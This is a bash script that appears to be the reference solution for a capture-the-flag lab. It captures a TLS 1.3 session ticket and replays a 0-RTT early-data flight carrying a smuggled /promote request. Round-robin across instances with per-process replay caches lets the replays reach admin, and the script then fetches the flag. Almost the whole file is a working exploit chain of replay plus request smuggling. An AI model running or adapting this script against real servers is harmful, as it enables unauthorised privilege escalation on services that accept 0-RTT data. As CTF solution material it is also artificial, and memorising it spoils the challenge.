#!/usr/bin/env bash
# Reference exploit for the 0-RTT desync + cross-instance replay chain.
#
# Uses a real TLS 1.3 0-RTT client (`openssl s_client -early_data`):
#   0. full handshake to capture a resumable ticket that advertises early_data
#   1/2. replay ONE early-data flight (benign request + smuggled /promote) across
#        connections; the LB's round-robin spreads replays over both instances,
#        so the two accepted submissions land step=1 then step=2 despite each
#        instance's local (per-process) replay cache
#   3. fetch /flag on a normal connection with the same token
#
# NOTE: we deliberately do NOT pass `-quiet` to s_client — it implies `-ign_eof`,
# which stops the client closing on stdin EOF and deadlocks. Instead we hold
# stdin open briefly (`sleep`) so the client reads the server response before it
# tears the connection down.
set -euo pipefail

HOST="${HOST:-127.0.0.1}"
PORT="${PORT:-8443}"
SNI="${SNI:-lab}"
HOLD="${HOLD:-1}"                 # seconds to keep the client connection open
TOKEN="ctf-$$-${RANDOM}"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

FLIGHT="$WORK/flight.bin"
# Pipelined early-data flight: a benign first request (which the front tags with
# Early-Data: 1) immediately followed by a SMUGGLED /promote (which the front
# forwards untagged -> bypasses the backend's per-request 425 guard).
printf 'GET /warm HTTP/1.1\r\nHost: %s\r\n\r\nGET /promote HTTP/1.1\r\nHost: %s\r\nX-Token: %s\r\n\r\n' \
    "$SNI" "$SNI" "$TOKEN" > "$FLIGHT"

sc() { timeout 15 openssl s_client -connect "$HOST:$PORT" -servername "$SNI" -tls1_3 "$@" 2>/dev/null; }

echo "[*] target=$HOST:$PORT token=$TOKEN"

echo "[*] step 0: full handshake -> capture a 0-RTT-capable ticket"
{ printf 'GET / HTTP/1.1\r\nHost: %s\r\n\r\n' "$SNI"; sleep "$HOLD"; } \
    | sc -sess_out "$WORK/sess.pem" >/dev/null
[ -s "$WORK/sess.pem" ] || { echo "[!] no session ticket captured"; exit 1; }

echo "[*] step 1+2: replay the same 0-RTT flight until admin is granted"
got=0
for i in $(seq 1 10); do
  out="$(sleep "$HOLD" | sc -sess_in "$WORK/sess.pem" -early_data "$FLIGHT" || true)"
  line="$(printf '%s' "$out" | tr -d '\r' | grep -aE 'promote|replay' | paste -sd'; ' - || true)"
  echo "    [flight $i] ${line:-<no promote response>}"
  if printf '%s' "$out" | grep -qa 'admin-granted'; then got=1; break; fi
done
[ "$got" -eq 1 ] || { echo "[!] never reached step=2 / admin"; exit 1; }

echo "[*] step 3: fetch the flag on a normal connection"
flag="$({ printf 'GET /flag HTTP/1.1\r\nHost: %s\r\nX-Token: %s\r\n\r\n' "$SNI" "$TOKEN"; sleep "$HOLD"; } \
    | sc | tr -d '\r' | grep -aoE 'ccsCTF\{[^}]*\}' | head -1 || true)"
if [ -n "$flag" ]; then
  echo "[+] FLAG: $flag"
else
  echo "[!] admin reached but flag not returned"; exit 1
fi
